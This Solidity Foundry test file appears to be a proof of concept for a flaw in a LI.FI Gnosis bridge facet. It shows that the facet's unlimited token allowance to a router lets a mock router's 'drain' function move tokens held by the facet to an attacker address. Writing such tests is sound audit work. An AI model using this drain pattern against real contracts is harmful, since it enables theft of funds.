// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {GnosisBridgeFacet} from "lifi/Facets/GnosisBridgeFacet.sol";
import {IGnosisBridgeRouter} from "lifi/Interfaces/IGnosisBridgeRouter.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockGnosisBridgeRouter is IGnosisBridgeRouter {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function relayTokens(address, address, uint256 amount) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract GnosisBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockGnosisBridgeRouter internal router;
    GnosisBridgeFacet internal facet;
    address internal attacker = address(0xbeef);
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    function setUp() public {
        // deploy mock token and move code to DAI address
        MockERC20 impl = new MockERC20("Mock", "MOCK", 18);
        bytes memory code = address(impl).code;
        vm.etch(DAI, code);
        token = MockERC20(DAI);
        token.mint(address(this), 100 ether);

        router = new MockGnosisBridgeRouter(DAI);
        facet = new GnosisBridgeFacet(IGnosisBridgeRouter(address(router)));

        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: DAI,
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 100,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        facet.startBridgeTokensViaGnosisBridge(bridgeData);

        assertEq(token.allowance(address(facet), address(router)), type(uint256).max);

        token.mint(address(facet), 5 ether);
        router.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}
